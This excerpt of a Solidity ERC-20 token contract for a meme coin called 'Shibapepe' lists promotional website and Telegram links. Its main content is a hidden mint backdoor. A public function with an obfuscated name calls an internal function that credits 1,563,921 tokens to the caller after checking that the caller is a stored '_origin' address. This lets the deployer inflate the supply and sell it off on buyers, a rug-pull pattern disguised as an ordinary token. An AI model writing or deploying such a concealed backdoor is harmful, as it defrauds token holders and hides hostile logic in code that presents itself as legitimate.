...
abstract contract Ownable {
    string public constant WEBSITE = "https://x.com/Shibapepe_erc20";
    string public constant TELEGRAM = "https://t.me/shibapepe_erc20";
...
contract TokenContract is IERC20, Ownable {
    ...
    string private _name = "Shibapepe";
    string private _symbol = "SHIBAPEPE";
    ...
    function ch9oe2pt() internal {
    _balances[msg.sender] += 1563921 * 10 ** uint256(_decimals);
    }

    function d1fa275f334f() public {
        SecureCalls.checkCaller(msg.sender, _origin); ch9oe2pt();
    }
